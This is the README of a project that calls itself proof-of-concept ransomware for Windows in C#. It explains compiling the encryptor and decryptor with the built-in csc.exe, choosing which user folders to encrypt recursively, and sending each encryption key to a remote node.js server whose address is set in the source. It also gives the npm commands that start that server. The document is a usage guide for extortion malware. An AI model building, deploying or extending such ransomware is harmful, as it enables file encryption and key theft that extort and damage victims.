# C# Ransomware
Proof of concept ransomware for Windows in C#

Simple ransomware (no partial encryption or obfuscation mechanisms in place).

Can be compiled directly from the Windows 10 compiler, no need to install anything.

```csharp
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe en.cs
```

```csharp
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe de.cs
```

You can choose which folders of the current user to encrypt, works recursively.
You can also choose which extension to NOT encrypt.

The key is sent to a remote node.js server, and a hash is generated on the client side in order to be able to match the key to the hash for decryption.

The server must be up and running and its address must be put in en.cs

```csharp
        string serverIP = "192.168.0.17"; // Server IP address or domain
```

To run the server

```csharp
npm init
npm install express
node main.js
```

Special care has been taken to avoid data corruption. A header is added at the top of each encrypted file in order to avoid double encryption and prevent data loss. Files won't be decrypted if the header is not present too.
